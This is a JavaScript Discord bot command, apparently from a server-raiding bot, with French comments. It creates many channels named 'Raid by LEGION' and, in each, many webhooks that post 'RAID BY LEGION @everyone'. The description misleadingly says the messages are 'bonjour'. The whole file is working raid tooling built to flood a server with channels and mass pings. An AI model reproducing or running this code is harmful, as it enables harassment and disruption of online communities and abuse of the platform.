module.exports = {
    name: "massping",
    aliases: [],
    description: "Crée un certain nombre de canaux et des webhooks qui envoient un message 'bonjour' un certain nombre de fois.",
    run: async (message, args, command, client) => {
        // Vérifie que l'utilisateur a fourni les arguments nécessaires
        if (args.length < 2) {
            return message.channel.send("Utilisation correcte : !spam <nombre_de_canaux> <nombre_de_messages>");
        }

        const numChannels = parseInt(args[0]);
        const numMessages = parseInt(args[1]);

        if (isNaN(numChannels) || isNaN(numMessages)) {
            return message.channel.send("Les arguments doivent être des nombres valides.");
        }

        // Crée un certain nombre de canaux et des webhooks
        for (let i = 0; i < numChannels; i++) {
            message.guild.channels.create(`Raid by LEGION`, {
                type: 'text',
            })
            .then(newChannel => {
                for (let j = 0; j < numMessages; j++) {
                    newChannel.createWebhook('LEGION', {
                        avatar: 'https://cdn.discordapp.com/attachments/858849789977952286/1170120429160124427/image.png?ex=6557e292&is=65456d92&hm=b451b98cfe4d816c745110983072ee37e176e42764b5dd0d5b48827f3b3c2ced&' // URL de l'avatar du webhook (facultatif)
                    })
                    .then(webhook => {
                        webhook.send("RAID BY LEGION @everyone");
                    })
                    .catch(error => {
                        console.error('Erreur lors de la création du webhook :', error);
                    });
                }
            })
            .catch(error => {
                console.error('Erreur lors de la création du canal :', error);
            });
        }
    }
}
